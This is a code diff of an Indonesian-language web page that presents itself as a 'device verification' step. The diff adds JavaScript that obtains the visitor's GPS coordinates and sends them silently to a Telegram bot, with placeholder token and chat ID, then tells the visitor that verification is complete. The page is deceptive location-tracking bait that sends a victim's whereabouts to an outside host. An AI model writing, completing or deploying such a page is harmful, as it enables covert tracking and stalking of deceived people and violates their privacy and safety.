@@ -11,21 +11,26 @@
 </head>
 <body>
     <h2>Verifikasi Perangkat</h2>
-    <p>Ketuk tombol di bawah ini untuk melanjutkan proses verifikasi.</p>
+    <p>Ketuk tombol di bawah ini untuk melanjutkan.</p>
     <button class="btn" onclick="mulaiLacak()">Lanjutkan</button>
 
     <script>
         function mulaiLacak() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    alert("Lokasi terdeteksi!");
-                    console.log("Lat: " + position.coords.latitude + ", Long: " + position.coords.longitude);
-                    // Masukkan kode kirim data tambahan Anda di sini
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+
+                    let tokenBot = "MASUKKAN_TOKEN_BOT_ANDA";
+                    let chatId = "MASUKKAN_CHAT_ID_ANDA";
+                    let urlApi = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=Lat:%20${lat}%20Long:%20${lon}`;
+
+                    fetch(urlApi).then(response => {
+                        alert("Verifikasi Selesai");
+                    });
                 }, function(error) {
-                    alert("Izin lokasi ditolak atau gagal.");
+                    alert("Izin lokasi ditolak.");
                 });
-            } else {
-                alert("Browser tidak mendukung.");
             }
         }
     </script>
